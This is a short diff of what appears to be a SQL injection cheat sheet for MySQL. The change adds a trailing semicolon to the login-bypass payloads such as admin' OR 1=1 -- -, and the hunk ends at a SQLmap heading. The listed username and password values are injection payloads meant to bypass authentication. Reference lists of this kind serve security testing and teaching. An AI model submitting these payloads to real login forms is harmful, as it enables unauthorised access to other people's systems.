@@ -7,8 +7,8 @@ MySQL
 Username: Administrator
 Password: ' OR 1=1#
 
-Username: admin' OR 1=1 -- -
-Password: admin' OR 1=1 -- -
+Username: admin' OR 1=1 -- -;
+Password: admin' OR 1=1 -- -;
 ```
 
 ## SQLmap
